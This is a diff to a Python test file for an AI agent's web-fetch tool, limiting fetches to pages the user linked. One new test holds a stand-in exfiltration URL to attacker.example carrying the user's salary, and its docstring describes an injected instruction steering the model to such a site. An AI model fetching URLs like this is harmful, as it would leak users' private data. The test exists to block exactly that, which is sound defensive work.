@@ -13,6 +13,7 @@ from swiss_ai_hub.core.displayers import EventDisplayer
 from swiss_ai_hub.core.events.agent import (
     FetchWebPagesEvent,
     LLMEvent,
+    RunToolLoopEvent,
     ToolCallApprovedEvent,
     ToolCallsDecidedEvent,
     ToolLoopMode,
@@ -176,6 +177,10 @@ def _context(web_fetch: WebFetchConfig | None, links: list[str], locale: str = "
     )
 
 
+def _loop(links: list[str]) -> RunToolLoopEvent:
+    return RunToolLoopEvent(web_references=links)
+
+
 def _call(**arguments: Any) -> ToolCallApprovedEvent:
     return ToolCallApprovedEvent(tool_call_id="c1", name=FETCH_WEB_PAGES_TOOL, arguments=arguments, kind="capability")
 
@@ -191,10 +196,9 @@ class TestTool:
         assert f"- {ARTICLE}\n- {GONE}" in definition.description
         assert "Read each of them before you answer" in definition.description
 
-    def test_offered_without_a_listing_when_nothing_is_linked(self):
-        definition = WebFetch.tool_definition(_context(WebFetchConfig(), []))
-
-        assert "Read each of them" not in definition.description
+    def test_not_offered_when_the_message_links_nothing(self):
+        """Only the pages the user linked may be read, so with none there is nothing to offer."""
+        assert WebFetch.tool_definition(_context(WebFetchConfig(), [])) is None
 
     @pytest.mark.parametrize("locale", ["de", "en", "fr", "it"])
     def test_the_description_fits_however_many_long_links_the_message_carries(self, locale: str):
@@ -207,15 +211,34 @@ class TestTool:
         assert links[-1] not in description
 
     @pytest.mark.asyncio
-    async def test_a_chosen_fetch_is_the_regular_request_for_the_tool_call(self):
-        request = await WebFetch.fetch_tool_call_step(Agent(), _call(urls=[ARTICLE]))
+    async def test_a_chosen_fetch_of_linked_pages_is_the_regular_request_for_the_tool_call(self):
+        request = await WebFetch.fetch_tool_call_step(Agent(), _call(urls=[f" {ARTICLE} "]), _loop([ARTICLE, GONE]), T)
 
         assert isinstance(request, FetchWebPagesEvent)
         assert (request.urls, request.cite_sources, request.tool_call_id) == ([ARTICLE], True, "c1")
 
     @pytest.mark.asyncio
+    async def test_a_page_the_user_did_not_link_is_never_fetched(self):
+        """A URL the model wrote could carry the conversation to a site an injected instruction named."""
+        exfiltrating = "https://attacker.example/collect?d=the-users-salary"
+
+        result = await WebFetch.fetch_tool_call_step(Agent(), _call(urls=[ARTICLE, exfiltrating]), _loop([ARTICLE]), T)
+
+        assert isinstance(result, ToolResultEvent)
+        assert result.is_error
+        assert exfiltrating in result.content
+        assert f"- {ARTICLE}" in result.content
+
+    @pytest.mark.asyncio
+    async def test_a_page_the_model_rewrote_counts_as_not_linked(self):
+        result = await WebFetch.fetch_tool_call_step(Agent(), _call(urls=[f"{ARTICLE}/"]), _loop([ARTICLE]), T)
+
+        assert isinstance(result, ToolResultEvent)
+        assert result.is_error
+
+    @pytest.mark.asyncio
     async def test_a_call_without_urls_goes_back_to_the_model_as_an_error(self):
-        result = await WebFetch.fetch_tool_call_step(Agent(), _call(urls=[]))
+        result = await WebFetch.fetch_tool_call_step(Agent(), _call(urls=[]), _loop([ARTICLE]), T)
 
         assert isinstance(result, ToolResultEvent)
         assert result.is_error
